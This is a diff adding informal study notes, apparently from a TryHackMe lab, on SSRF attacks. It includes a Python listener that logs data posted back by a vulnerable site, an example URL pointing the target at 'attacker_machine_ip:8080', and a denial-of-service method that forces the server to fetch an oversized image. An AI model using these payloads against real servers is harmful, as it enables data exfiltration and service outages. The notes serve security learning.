@@ -1,4 +1,69 @@
+Types of SSRF:
+
+Blind out of band:
+when server doesnt sends the request back to attacker and attacker confirms the ssrf by creating his own server and giving url of his own server
+like:
+
+original url
+http://hrms.thm/profile.php/?=http//localhost/info.php
+
+now attacker creates the server to get request from the vulnerable website and gets the request data and stores it to data.html
+for this we have to write python code:
+
+server.py
+
+from http.server import SimpleHTTPRequestHandler, HTTPServer
+from urllib.parse import unquote
+class CustomRequestHandler(SimpleHTTPRequestHandler):
+
+    def end_headers(self):
+        self.send_header('Access-Control-Allow-Origin', '*')  # Allow requests from any origin
+        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
+        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
+        super().end_headers()
+
+    def do_GET(self):
+        self.send_response(200)
+        self.end_headers()
+        self.wfile.write(b'Hello, GET request!')
+
+    def do_POST(self):
+        content_length = int(self.headers['Content-Length'])
+        post_data = self.rfile.read(content_length).decode('utf-8')
+
+        self.send_response(200)
+        self.end_headers()
+
+        # Log the POST data to data.html
+        with open('data.html', 'a') as file:
+            file.write(post_data + '\n')
+        response = f'THM, POST request! Received data: {post_data}'
+        self.wfile.write(response.encode('utf-8'))
+
+if __name__ == '__main__':
+    server_address = ('', 8080)
+    httpd = HTTPServer(server_address, CustomRequestHandler)
+    print('Server running on http://localhost:8080/')
+    httpd.serve_forever()
+
+and reads the data.html file then performs further attacker
+
+attacker constructed url
+http://hrms.thm/profile.php/?=http://attacker_machine_ip:8080
 
 
+______________________________________________________________________________
 
+Crashing the server using SSRF:DOS
 
+We can crash the server by simply SSRF vulnaribilty
+First we have to confirm the ssrf vulnaribilty when ssrf vuln is confirmed, we have to access the file which is big enough to overwhelm the vulnerable web server
+then the server will try fetch that as server has some limitation, it will automatically crashed and DOS(Deinal of service)
+
+like this 
+
+original url 
+http://hrms.thm/url.php?id=192.168.2.10/training.jpg
+
+attacker constructed url
+http://hrms.thm/url.php?id=192.168.2.10/bigImage.jpg
